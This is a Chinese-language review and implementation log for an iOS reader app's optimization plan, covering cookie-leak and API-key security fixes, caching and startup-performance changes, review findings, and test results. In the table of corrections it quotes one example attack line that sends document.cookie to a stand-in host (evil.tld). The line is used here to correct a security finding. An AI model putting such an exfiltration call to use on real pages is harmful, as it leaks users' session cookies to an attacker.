# optimization-plan-2026-09-23 复核与落地记录

- 日期：2026-09-23
- 复核对象：`docs/optimization-plan-2026-09-23.md`
- 复核方式：逐条把文档断言拉回真实代码/真实站点文件核对；随后按核对结果落地修复
- 本次工作区：HEAD = `74c6fbe`（文档写的是 `d282bd7`，中间多了一个 commit）
- 不做的范围：文档 §5「iOS 原生 Swift 重写」（按要求跳过）

---

## 1. 复核结论（先说哪条对、哪条不对）

文档的根因链和优化方向**整体成立**，可以直接照着做。下面只列需要修正的部分。

### 1.1 文档写错的地方

| # | 文档说法 | 实际情况 | 影响 |
|---|---|---|---|
| 1 | S1：「`Http.get({url:'https://evil.tld/?c='+document.cookie})` 就能把 **httpOnly** 会话 Cookie 外带」 | **不成立**。httpOnly Cookie 本来就不在 `document.cookie` 里（文档自己在别处也这么说）；而且 `nativeCookies(for:)` 早就按 host 后缀过滤了，`evil.tld` 匹配不到任何 sangtacviet Cookie。**真实存在的是另一件事**：调用方自己传的 `Cookie:` 头（即 `document.cookie`）被原样转发到任意域名，所以泄漏的是**非 httpOnly** Cookie；此外页面脚本可以借插件抓取任意同站已登录接口的响应 | 修复方向要改（见 §2.1） |
| 2 | P1：「翻译批处理：评论/帖子翻译**逐条**发请求，改批量」 | **已经批处理了**。`chunkTexts()` + `MAX_CHARS = 3000` + `engineBatch(chunk, ...)`，现有测试就断言两条帖子只发一次请求 | 无需改动 |
| 3 | P1：「图片：封面统一 `loading="lazy"` + `decoding="async"`」 | 站点**已经**在封面 `<img>` 上写了 `loading="lazy"`（`_page_vip.html:2062` 等，还有自己的 `lazyload` class 和 IntersectionObserver 加载器） | 无需改动（只差 `decoding="async"`，收益不值一次改动） |
| 4 | 引文位置：base64 WAV 在 `NativeSpeech.swift:211` | 实际在 `SangTacAppPlugin.swift:211`（`data.base64EncodedString()`） | 只是引错文件 |
| 5 | 「18 块 212.9KB 注入 JS」/「24 markers」/ `pageRepair` 50.5KB | 复核起点实测：**19 块 266,977 字节**，**27 markers**，`pageRepair` **56.9KB**。差异来自 `d282bd7 → 74c6fbe` 那次提交（`SitePatch.swift` +117 行，全落在 `pageRepair` 里） | 结构性结论不变：`bootShell` 前面压着 `pageRepair` + `commentTranslate` ≈ 119KB |
| 6 | 各条 `SitePatch.swift:NNNN` 行号 | 因为第 5 条，整体偏移约 +117（如 `SitePatch.all` 5190 → 5316，`googleBatch` 3934 → 4041） | 阅读时按符号名找，别按行号 |

### 1.2 文档说漏的一处

`_page_vip.html:5211` 还有第四个被 `Math.random()` 破缓存的 URL：`/asset/app.v2.config.js?`。P0-1 的修复一并覆盖了它。

### 1.3 逐条确认无误的断言

全部有出处，复核时逐条对过：

- **R1**：`_page_vip.html:3066`（CSS）、`:5207`（app.v2.js）、`:5208`（bookdisplay）、`:5211`（config）四处 `Math.random()`；`stv.ui.js` 里 `ui.scriptmanager.load` 的实现与文档引文**逐字一致**。
- **R1 的关键细节（文档没强调，但决定了修法）**：`scriptmanager.load` 是**先 append `<script>` 再赋 `.src`**。所以只拦 `appendChild` 来不及，必须拦 `src`/`href` 的 setter。
- **R1 的另一个细节**：`stack` 的 key 是**加 `?nocache=` 之前**的 URL。app 模式下 `isCachedFrontend = window.hasOwnProperty("Capacitor")`（`app.v2.js:15`）为 true，`!isCachedFrontend` 为 false，所以站点对四个阅读器模块都用**干净 URL**——这正是 P0-5 预取能命中站点去重的前提。
- **R2**：`stv.ui.js` 里非 async/defer 脚本确实是 `await new Promise(resolve => ui.scriptmanager.load(script.src, resolve))` 串行。
- **R3**：`bestDomain()`（`_dl_app.v2.js:933-956`、`:1036-1059`）只在 `this.domains` 里存在 `status == "alive"` 的记录时才认 `app.config.ux.app_domain`（`:937-943`）→ 文档「把域名固化进配置单独用是无效的」**正确**；`checkDomains()` 开头 `this.domains = []`（`:1063`）**正确**；XHR 侧 `defaultDomains` 把 dns1 排第一（`:1035`）**正确**。
- **R4**：`SitePatch.all` 的注入顺序与文档所列**完全一致**，`bootShell` 排第 18（共 19 块）。
- **R5**：`bootShell` 采样点 0/1/3/6/10/20s + 30s 兜底，逐字一致。
- **R6**：`SangTacHttpPlugin.swift:397-412` 确为「主线程跳转 + `getAllCookies` 全量枚举 + 逐个 host 后缀匹配」，且每请求一次。
- **R7**：`preview()` 整包 UTF-8 解码 + `split`/`join`；`report()` 每次一条 `JSONSerialization` + `evaluateJavaScript`；JS 侧 Round 14 已加闸门，**原生侧确实一分没省**。
- **R8**：四个模块的真实加载点全部找到——`/asset/app.v2.read.js`（`app.v2.js:3943`）、`/asset/app.v2.chapterdisplay.js`（`app.v2.read.js:237`）、`/stv.tts.js?v=7`（`app.v2.read.js:2341`）、`/hanviet.js`（`_page_vip.html:4546`）。
- **S2/S3/S4/S5**：Google Key 拼在 URL（`:4041-4043`）、日志记完整 URL、Key 明文进 `app.storage`、设置页明文回显、Keychain 用 `kSecAttrAccessibleAfterFirstUnlock`、`settingsSave`/`settingsRestore` 无来源校验、`allowNavigation` 面过大——全部属实。
- **P1 的一条「确认项」**：`diag` 块的 console tee 与点击/touch 监听**已经**是懒生效（`if (!enabled) { return; }` 早退），无需再改。

---

## 2. 已落地的修复

验证方式：`scripts/check-ios-shim.js`（21 块注入 JS 全部可解析）、`scripts/test-site-patch.js`（**428 条断言全绿**，改动前 301 条）、`scripts/gen-site-i18n.js --check`。所有改动的 JS 部分都在 DOM 桩里真跑过；Swift 部分本机无编译器，只能靠审读（见 §4）。

### 2.1 安全（S1–S5）

| 项 | 落地内容 |
|---|---|
| **S1** | `SangTacHttpPlugin` 新增 `cookieHosts` 白名单（`sangtacviet.com/.vip/.app` + `stv-appdomain-00000001.org`）。**只有**这些 host 会带上 Cookie——原生的和调用方传的都算；其余 host 的请求照发，但 `Cookie` 头被摘掉。`nativeCookies` 在 `allowed == false` 时直接返回空，连 Cookie store 都不读。**没有硬拒绝非白名单域名**，因为设置页有「自定义接口地址」，硬拒绝会把用户自建翻译端点一起打死；而 S1 的真实攻击面是「带 Cookie 外带」，摘掉 Cookie 就够了。 |
| **S2** | ① `googleBatch` 改用 `X-goog-api-key` 请求头，URL 里不再有 `?key=`。② `SangTacHttpPlugin` 新增 `redact()`，对 query 里的 `key/api_key/access_token/token/password/secret/signature/sig`、JSON 里的同名字段、以及 `Ocp-Apim-Subscription-Key`/`Authorization`/`X-goog-api-key` 三类头统一替换成 `***`；`callLog` 与 `report` 全部走它。 |
| **S3** | Key 从 `app.storage` 里彻底搬走：新增独立 Keychain 命名空间 `com.sangtacviet.mobilereader.secrets`，可访问性 `kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly`（**不进 iCloud/iTunes 备份、不随换机迁移**）。`stv.translate.settings` 只留 `hasApiKey` 布尔。设置页的 Key 输入框**永远以空值打开**，占位符显示「已保存（留空则不修改）」，另加「清除」按钮；保存后输入框再次清空并重新掩码。旧版明文 Key 在首次读取时自动迁移进 Keychain 并把记录改写掉；Keychain 写失败则保留原明文而不是丢 Key。 |
| **S4** | `settingsSave`/`settingsRestore`/`secretSave`/`secretLoad` 开头统一走 `isTrustedCaller()`：主 frame 的 host 必须是 sangtacviet 三域之一，否则 reject。`settingsSave` 另加 key 白名单（与 JS 侧 `settingsBackup` 的 `KEYS`/`PREFIXES` 严格一致）、64 字符 key 上限、512KB value 上限；secret 另限 64 字符 / 8KB。 |
| **S5** | `capacitor.config.json` 的 `allowNavigation` 删掉 `sangtacviet.vip` 与 `*.sangtacviet.vip`——站点自己的 `defaultDomains` 里根本没有 `.vip`，仓库里也没有任何引用。保留 `.com`/`*.sangtacviet.com`（`server.url` 所在域）、`.app`/`*.sangtacviet.app`（在 `defaultDomains` 里，正文与下载在用）、`challenges.cloudflare.com`（Turnstile 登录挑战）。`limitsNavigationsToAppBoundDomains: false` 必须保留，否则远程 `server.url` 直接加载不了；真正的边界现在是 §2.1 里的插件层来源校验。 |

### 2.2 性能（P0-1 ~ P0-6）

**P0-1 站点 cache-buster 稳定化（新块 `assetCache`，注入顺序第 2）**

把随机串换成稳定 token。生命周期不是拍脑袋定的：站点自己发的就是 `max-age=86400`，所以 token 每天变一次，正好等于服务器要求的缓存时长。另加一个 `generation` 计数，「设置 → 强制刷新站点资源」点一下就把所有 URL 换一代并 reload，不用等到第二天。

拦截点选了 **属性 setter** 而不是插入钩子，因为 `scriptmanager.load` 是先 append 再赋 `.src`：`HTMLScriptElement.src`、`HTMLLinkElement.href`、`HTMLImageElement.src` 的 setter，外加 `Element.prototype.setAttribute`（外壳用它建 `<link>`）。范围刻意收窄：只有 `/asset/` 下的 URL，且只改 `?<随机>` / `?r=<随机>` / `?nocache=<随机>`；`?v=1.360`、`?v2`、`?v=7` 这些真版本号一律不碰。

**P0-2 记住上次可用的镜像（`domainFailover` 扩展）**

站点每次启动都在三个镜像间跑 ping 竞速，而 `verifyDomain()` 只探 `/warp.php`，所以赢的常常是「每个 readchapter 都回 code 7」的那台。现在把上次真的返回过正文的镜像记进 `localStorage`（6 小时有效），`bestDomain()` 包装里优先返回它；探测照旧在后台跑，不会被阻塞。安全约束：记录的域名必须**同时**在站点自己的 `mirrors`/`defaultDomains` 列表里，所以伪造 `localStorage` 无法把 App 指到别的 origin；镜像被 ban 或过期即失效。

**P0-3 注入顺序（只做重排，没做延后）**

`all` 重排成「首屏必需在前」：`compat` → `assetCache` → `diag` → `storageAccessor`/`readerDefaults`/`safeArea`/`domainFailover`/`bootShell`/中译字典 → 其余。这样**首屏外壳画出来之前**要解析的注入量从 ~285KB 降到约 60KB，正是文档要的那个指标。

**没有**做文档提议的「把 9 个块延后到 load/idle」：唯一的实现方式是把块源码包进 `eval` 再由定时器触发，而测试桩只能直接跑块源码、覆盖不到这层包装——等于在一个本机无法编译、无法运行的 App 里塞一段没人验证过的动态求值。而它的收益是 P0 里最小的一条（约 50–150ms）。重排已经把文档的验收指标拿到了。

**P0-4 Http 插件热路径**

- **Cookie 快照**：注册 `WKHTTPCookieStoreObserver` 维护内存快照，请求路径同步读；快照没热时降级回原来的异步全量读。另外 `storeResponseCookies` 收到 Set-Cookie 时**同步**合并进快照（观察者是异步的），保证登录往返的下一个请求不会漏掉刚拿到的会话 Cookie。
- **诊断懒计算**：`setDiagnostics` 方法 + 锁保护的开关，由 `diag` 块在开关变化时推送（并在 DOMContentLoaded / 2s 后各补推一次，因为原生侧默认关）。热路径上闸门判断放在**字符串拼接之外**，关掉时 `preview()` 根本不会被调用。5xx 与传输错误仍然强制上报。
- **按需解码**：`responsePayload` 不再无条件整包 UTF-8 解码——JSON 分支直接解析、base64 分支完全不碰 UTF-8、文本分支才解码。
- **日志批量**：多条合并成一次 `evaluateJavaScript`（`__stvDiag.logBatch`，新增）。
- **`preview()` 有界**：只取前 4096 字节/字符再折叠空白。
- `URLCache` 提到 64MB 内存 / 512MB 磁盘。

**P0-5 阅读器预取 + 章节缓存**

- **模块预取**（新块 `readerPrefetch`）：首屏 `load` 之后一个 idle 槽再预取四个阅读器模块。因为 app 模式下站点用的就是干净 URL，`stack` 的 key 完全对得上——站点自己后来那次 `load` 会命中预取条目**只等不取**，连站点 `nocache` 去重的 bug 都顺手绕过了（测试里断言了这一点）。
- **章节正文缓存**（Http 插件内 `ResponseCache`）：`sajax=readchapter` 命中即返回，响应体按和网络路径**同一个** `responsePayload` 重建（该函数的类型行为是承重的，`getContent2` 会对 text/html 结果调 `r.data.replace(...)`）。300 章 / 100MB 上限，LRU 淘汰；只缓存 2xx 且 ≥4KB 的响应（站点的失败应答是几十字节的 JSON，缓存它会让失败粘住；短章节只是不缓存，失败方向是安全的）。**会话内内存缓存**，App 重启即清空。

**P0-6 首屏外壳确定性释放**

`bootShell` 新增：`MutationObserver` 盯 `<head>` 里新增的 `link`/`style`，以及给已存在的 `<link>` 挂 `load`/`error`——样式表一被应用立刻摘外壳。原来的 0/1/3/6/10/20s 采样**保留为兜底**（给「脚本直接往 `document.styleSheets` 里塞」这种没有事件的情况）。1.1s 到的样式表不再等到 3s 才摘。

### 2.3 P1

- **PCM 批量拷贝**（`NativeSpeech.swift`）：`PcmAccumulator.append` 改成「按 `frames * channels` 一次分配 + 裸指针填充 + 一次 `append(contentsOf:)`」，替掉逐样本 `append`；`wavContainer` 预留容量并用 `samples.withUnsafeBytes` 直接写进 `Data`（原先 `Data(bytes:)` 会先建一份整句临时拷贝再 append）。`snapshot()` 改名 `take()` 并在返回前清空累加器，让累加器不再多持有一份。
  - 注意：`take()` **不是**「避免一次拷贝」——返回数组本来就是 O(1) 的写时复制 retain，两种写法都不拷贝（这条在独立复核里被纠正，注释已改成真实理由）。
- **翻译会话超时任务随请求取消**（`TranslationBridge.swift`）：30s 的 `Task.sleep` 改为存在 `deadlines[requestId]` 里，`adopt()` / `fail()` 都会 `cancel()`。长会话不再堆积「醒来只调用一次空操作 fail()」的睡眠任务。（复核确认：这不会让请求永久挂住，也不会泄漏 `deadlines` 条目——只有 `adopt` 和 `fail` 会移除 `pending`，两处都取消。）
- **未做**：TTS 去 base64（改走 `WKURLSchemeHandler` 需要动 web view 配置，本机无法编译验证）；重库（html2canvas / iro / crypto-js / materialize）屏蔽——文档自己也写着要先「确认站点是否在启动路径上调用它们」，这需要真机证据；书架/首页 stale-while-revalidate 与相邻章预取（与文档 P2「离线优先」是同一件事，建议和 P2 一起评估）。

---

## 2.4 独立复核发现并已修掉的问题

Swift 改动本机无法编译，所以做了两轮独立只读复核（复核者读 vendored 的 Capacitor 8 源码 + 站点自己的 JS 作为证据）。结论：**没有编译错误**；下面这些是逻辑/注释问题，全部已修。

| 严重度 | 问题 | 处理 |
|---|---|---|
| **高（主路径可见）** | 章节缓存只按 URL 做 key，但站点在每次读正文前都会写 `transmode`/`foreignlang` cookie（`app.v2.read.js:609 setTransMode`，取值 `name`/`tfms`/`chinese` + `gg_en`/`vi`），正文语言跟着这两个 cookie 变。于是改过「翻译模式」之后，同一章会一直返回改之前那个语言，直到 App 重启。 | key 改为 `URL + "|" + 变体`。变体只取 `transmode`/`foreignlang` 的**值**加一个「是否登录」标志，**不**取完整 Cookie 头（`readcontextid` 会被服务端反复重发，按值做 key 会让缓存永不命中）。最关键的是**在哪里算这个 key**：初版我分别从「JS 传来的头」和「原生快照」两个来源取，但请求实际发出去的是两者的合并头（同名时原生优先），三者可以不一致——独立复核给出的可证反例是冷启动时 `access` 只在原生侧，于是「已登录」的正文会被存进 `|out` 这个 key，之后未登录的客户端就能命中它。修法：key 改为在 `nativeCookies` 回调里、`headers["Cookie"]` 定稿之后计算，**只**从「即将发出的那个头」推导，key 与实际请求不可能再分叉。 |
| **高** | 强制上报的失败行会被静默丢弃：开关关着时 JS 的 `logBatch` 直接 early-return，于是 `force` 那一次 4096 字节解码 + 跨进程调用换来的是零行、零徽标。 | `logBatch` 加第二个参数 `forced`：开关关着时只丢非强制批次；强制批次（即失败）仍然入缓冲，只是不渲染（没有面板可渲染），并且仍受 `MAX = 800` 上限约束。原生侧用 `pendingForced` 记录整批里是否含强制行。这样「没开过日志的读者」事后打开开关仍能看到失败——正是 `force` 想要的效果。 |
| 中 | 只按「2xx + ≥4KB」判断可缓存，一个 ≥4KB 的 Cloudflare 拦截页/登录页会被缓存并粘住整个会话。 | 新增 `isCacheableChapter`：去 BOM 后必须能被 `JSONSerialization` 解析成带 `code` 字段的对象，且 `code` 不是 `7`（镜像不能读）也不是 `10002`（超时）。站点自己的 `getContent2` 本来就要 `JSON.parse` 这个 body（`app.v2.read.js:582`），所以「不是 JSON」等价于「reader 已经坏了」，缓存它只会让坏状态粘住。 |
| 中 | `mergeSnapshot` 会把冷启动时只含单次响应 cookie 的**部分快照**标成「权威」，导致随后几个请求漏带 httpOnly 会话 cookie。 | 只有来自完整 `getAllCookies` 的 `setSnapshot` 才置 `cookieSnapshotReady`；冷启动期间继续走异步兜底读。 |
| 中 | 更细的一层：一次**先发出**的 `getAllCookies` 可能**后完成**，把刚才 `mergeSnapshot` 刚学到的会话 cookie 整个覆盖掉（而请求路径在快照热了之后是优先信快照的，于是后续请求集体丢会话）。 | 加 `snapshotGeneration`：`mergeSnapshot` 递增它，`setSnapshot` 带上「发起读时」的代号，代号过期的读直接丢弃。三个读入口（`load`、观察者、冷路径）都盖了章。 |
| 中 | `preview()` 用 `String(data:encoding:)` 解 4096 字节切片，长 CJK/越南文正文在字符中间被切断时返回 `nil` → 预览整行变空——恰好在这行最该有用的时候失效。 | 改用 `String(decoding:as: UTF8.self)`（有损、永不返回 nil）。 |
| 中 | 脱敏有缺口：带引号的 `"Authorization": "Bearer …"` 匹配不到；JSON 分支没有 `key`/`authorization`/`ocp-apim-subscription-key`/`x-goog-api-key`；`call.reject("Invalid URL: …")` 把原始 URL（可能含 `?key=`）发给页面和 Capacitor 自己的 os_log。 | JSON 分支补齐这些名字（含 `key`），不加引号的头分支保持不变以免两个模式重叠改写；两处 `call.reject` 都过 `redact()`。第二轮复核又补上连字符形式 `api[-_]?key` / `subscription[-_]?key`（Query 与 JSON 两侧），并确认不会与头分支重叠改写、无回溯风险。 |
| 低 | 4xx 不算「失败」，401/403 的 `callLog` 还标成 `ok`。 | 改成 `>= 400` 同时管强制上报和日志标签。 |
| 低 | `isCacheableChapter` 用 `String(describing:)` 比 `code`，JSON 里的 `7.0` 会渲染成 `"7.0"` 而漏过排除（当前不可达，因为这两种失败应答都远小于 4096 字节，先被体积门拦下）。 | 先用 `(code as? NSNumber)?.intValue` 比较，再回落到 `String(describing:)`。 |
| 低 | `isKnownHost`/`knownApiHosts` 是死代码，注释却写着「诊断面板可以列出它们」。 | 真正用起来：新增 `warnForeignHost`，第一次向非站点 host 发请求时打一行 `[policy] no cookies sent to <host>`（每 host 一次，带锁）。这也顺手解决了「站点将来加第二台镜像时，请求会成功但静默丢会话」这个不可见问题。 |
| 低 | `cookiesDidChange` 每次都全量 `getAllCookies`，而站点每次读正文都写 `transmode`/`foreignlang`，等于把快照省下的成本又还回去一部分。 | 合并：一个 runloop turn 最多刷新一次；刷新期间到来的变更会再排一次。 |
| 低 | 章节缓存 100MB + URLCache 64MB 同时驻留，3GB 设备上要留意 jetsam。 | 章节缓存降到 64MB（仍是 300 条上限）。 |
| — | `isTrustedCaller` 的注释**夸大了**它的作用（我原先写的）。 | 复核指出：Capacitor 的脚本消息处理不检查 `frameInfo.isMainFrame`（已核对 `node_modules/@capacitor/ios/.../WebViewDelegationHandler.swift:192`，确实没有），而 `bridge.webView.url` 报的是主 frame，所以**已经跑在站点页面里的脚本（XSS / 第三方脚本 / 恶意 iframe）照样能过**。注释已改成如实说明：它挡住的是「主 frame 被导航到别处但桥还在」这一种（`challenges.cloudflare.com` 就在 `allowNavigation` 里，所以这是真实可达状态）；对页面内脚本真正的边界是 key 白名单和「`secretLoad` 只回那一个具名 secret」，而这是注入方案的固有代价（文档 S6 说的就是这件事）。 |
| 低 | `settingsSave` 的 key/大小上限只在 Swift 侧，JS 侧 `mirror()` 用空 `.catch` 吞掉拒绝 → 备份静默停止。 | `mirror()` 改为按 key 上报一次 `[ERR] keychain backup refused <key>`，成功时清除该标记。 |
| 低 | `secretSave` 把「缺 `value`」当成「清空」，一个畸形的 `secretSave({key})` 会静默删掉用户的 Key。 | 缺 `value` 直接 reject，只有显式空字符串才删除。 |
| 低 | `restore()` 在 promise 落地**之前**就置 `restored = true`，而拒绝只记日志 → 一次拒绝就让整个页面加载不再恢复设置。 | 拆成 `restoreStarted`（在飞）与 `restored`（已完成）；失败时两者都复位，定时器会重试（已写入的 key 会被「保留」逻辑跳过，重试幂等）。 |

第三轮复核（针对上面这些修法本身）结论：无编译错误、四项修法都成立；又留下 4 条 low，其中两条值得修，已修：

| 严重度 | 问题 | 处理 |
|---|---|---|
| 低（但有运行时代价） | 被丢弃的「过期快照读」不会重试。`mergeSnapshot` 在每次带 Set-Cookie 的响应上都会递增代号（readchapter 会重发 `readcontextid`），如果每次读都被撞掉，`cookieSnapshotReady` 就一直是 false，于是**每个请求都退回全量 `getAllCookies`**——正好把 P0-4 最值钱的那项优化还回去了。 | 把合并读抽成 `scheduleSnapshotRefresh()`，`setSnapshot` 发现自己的代号过期时再排一次。安静窗口里重试就会落地、快照转热；即使一直被撞，正确性也不受影响（`nativeCookies` 仍然用刚读到的 cookie 完成本次请求）。 |
| 低 | 缓存命中时只写 `callLog`（os_log），侧载包读不到，于是诊断面板里看不到命中行——而文档 §6 的验收指标恰恰就是靠 `[Http] sajax=readchapter … (cache)` 来确认真机缓存生效的。 | `serveCached` 增加一次 `report("Http", "… in Nms (cache)")`（`report` 本身受开关闸门，关着时零成本）。 |
| 低 | 缓存 key 不含 HTTP 方法（今天不可达：下载走 `&download=true`，URL 不同）。 | key 前加 `method + "|"`。 |
| 低 | JSON 脱敏只匹配带引号的值，`"key": 123` 这类漏过（今天无实际泄漏面）。 | 值部分改成 `("[^"]*"\|[^,}\s]+)`；并用 12 条等价 regex 性质检查验证（含「整行日志里不留 secret」「`?api-version=` 不误伤」「Cookie 头不被这三条规则误改」）。 |


---

## 3. 新增的回归守护

`scripts/test-site-patch.js` 从 301 条断言加到 **442 条**，其中新增：

- **`asset cache-buster stabiliser`**（17 条）：四个真实被破缓存的 URL 各自被稳定化、同一天内两次不同随机值映射到同一 URL、`?v=1.360` / `?v2` / `?v=7` 与 `/asset/` 外的 URL 一律不动、非字符串原样透传、`<script>.src` 后置赋值被拦到、`<link>.href` 与 `setAttribute` 两条路径都被拦到、强制刷新会换 token。
- **`translate API key storage`**（13 条）：旧版明文 Key 迁移进 secret store 且明文从 `app.storage` 里被改写掉、DOM 里不回显、留空保存**不**会删 Key、输入新 Key 会替换且保存后输入框清空、新 Key 不落 `app.storage`、「测试」按钮用的是存起来的 Key 而不是空字符串、「清除」才真的删。
- **`injection order`**（9 条）：每个声明过的块都恰好注入一次、`SiteI18nData.script` 在列、`compat`/`assetCache`/`diag` 的前三位、首屏必需块构成前缀、`bootShell` 排在 `pageRepair`/`commentTranslate` 之前。
- **`reader module prefetch`**（8 条）：load 之前不预取、load 之后四个模块都请求、URL 与站点一致、上报到面板、站点后续同 URL 的 `load` 命中去重不重复取。
- **`settings backup across reinstalls`** 追加 5 条：被原生 key 白名单拒绝的镜像**不会**静默丢弃、拒绝会上报且每个 key 只报一次、一次 `settingsRestore` 被拒后会重试而不是放弃、拒绝本身有日志。
- **`native diagnostics bridge`**（8 条）：面板导出原生侧要调用的 `logBatch`、整批行进入缓冲、`[ERR]` 行被计为错误、开关打开/关闭都会推给原生 Http 插件、关着时非强制批次被丢弃、**关着时强制（失败）批次仍入缓冲**、重新打开开关能看到关着期间收集的失败。（这条之前完全没覆盖，而 `logBatch` 一旦缺失，`evaluateJavaScript` 里会抛错且所有 `[Http]` 行静默消失。）
- **`readchapter mirror failover`** 追加 5 条：记住的镜像直接生效不再跑竞速、过期条目被忽略、不在站点镜像列表里的伪造条目被忽略、失败后被丢弃。
- **`first-paint shell`** 追加 3 条：样式表还没就位时外壳不摘、`link` 的 `load` 一到就摘、释放原因里写明是哪个信号。
- 测试桩本身也补了三处保真度：`window.addEventListener` 现在会被记录并由 `__dispatch` 触发（原来是个空函数）；`installFakeApp` 加了 `secretSave`/`secretLoad` 桩；加了 `settingsSaveRejects` / `settingsRestoreFails` 两个开关来模拟原生侧的拒绝。

`.github/workflows/build-ipa.yml` 与 `scripts/check-ios-shim.js` 的必需标记同步加了 `stvAssetCache`、`stvReaderPrefetchInstalled`。

---

## 4. 验证状态与残余风险

**已验证**（本机可跑）：

```
node scripts/check-ios-shim.js        ✓ 21 blocks, 293855 bytes, 29 markers
node scripts/gen-site-i18n.js --check ✓ in sync (458 labels, 35 fragments)
node scripts/test-site-patch.js       ✓ 442 assertions, 0 failures
```

**只能靠审读的**：本机没有 Swift 工具链，`.swift` 改动（Http 插件、App 插件、NativeSpeech、TranslationBridge）**没有经过编译**。三轮独立只读复核都没发现编译错误（已核对 vendored 的 Capacitor 8 源码与站点自己的 JS 作为证据），关键算法另用等价实现做了性质检查（缓存 key 9 条、脱敏 12 条，全部通过）。但落地前仍必须在 macOS 上跑一次 `xcodebuild`，再按文档 §6 在真机上看 `[BOOT] shell released at +Nms`、`[ASSET]`、`[PREFETCH]`、`[Http] ... (cache)` 四类日志。

**改动本身的残余风险**：

1. **P0-1 的缓存时效**：token 每天一变，若站点在同一天内改了 `/asset/app.v2.js` 而不改文件名，最长会拿到 1 天前的版本——与服务器自己声明的 `max-age=86400` 完全等价，且「设置 → 强制刷新站点资源」可以立刻破开。
2. **P0-1 的 setter 包装**：包装 `Element.prototype.setAttribute` 会影响页面每一次 `setAttribute`。已加 `value.indexOf('/asset/')` 快路径，只有命中才做别的判断；`stabilize()` 对非 `/asset/` 输入原样返回。但这是全局原型改动，真机上要留意有没有站点功能被影响。
3. **P0-5b 的章节缓存**：现在只有「2xx + ≥4KB + 能被 JSON 解析且带 `code` 字段 + code 不是 7/10002」才缓存，所以大体积的错误页/拦截页已经进不来；漏网的情况是「站点真的返回了一个 code 正常但内容不对的大响应」。缓存是会话内的，退出 App 重进即可清空。另外一个已知的保守取舍：`transmode`/`foreignlang` 之外如果还有别的 cookie 影响正文内容（目前没发现），缓存不会察觉。
4. **S1 的非白名单语义**：非白名单域名仍然可以发请求（只是不带 Cookie）。这是为了不打死自定义翻译端点而做的取舍；如果希望更严（直接拒绝），改 `allowsCookies` 的调用点为 reject 即可。第一次向非站点 host 发请求时会打一行 `[policy] no cookies sent to <host>`，方便发现「站点换了镜像导致静默丢会话」。
5. **S4 的来源校验**：如果将来站点把主 frame 迁到 `allowNavigation` 之外、或 `trustedHosts` 之外的域名，`settingsSave`/`settingsRestore` 会 fail-closed 并拒绝（日志里会打 `[SangTacApp:settingsXxx] refused for origin <host>`），同时 `restore()` 不再把这次拒绝当成「已恢复」，会继续重试。**注意**：这道校验挡不住已经跑在站点页面里的脚本（XSS/第三方脚本/恶意 iframe），原因与取舍见 §2.4 最后一行。
6. **Cookie 快照的合并刷新**：`cookiesDidChange` 现在一个 runloop turn 最多刷一次全量；如果在极窄的窗口里（App 刚启动、快照还没热）连续发生「读快照 + 写回 Set-Cookie」，有一条请求可能少带一个新 cookie，但写回 store 本身会再次触发观察者从而立刻修正。

---

## 5. 建议的执行顺序

1. macOS 上 `xcodebuild` 编过 + 三个守护脚本绿。
2. 真机基线：诊断面板打开，冷启动取 `[BOOT] shell released at +Nms` 与 `app.v2.js` 求值时刻；再看第二次冷启动是否出现 `[ASSET]` 与 `[Http] ... (cache)`。
3. 依次确认：首次进正文是否看到 `[PREFETCH]`、翻章回来是否命中 `(cache)`、设置页「强制刷新站点资源」是否生效、翻译 Key 保存后重进设置页是否只显示「已保存」。
4. 确认无误后再评估 P2（本地静态资源镜像）与 P0-5 剩下的两项（相邻章预取、书架 stale-while-revalidate）。
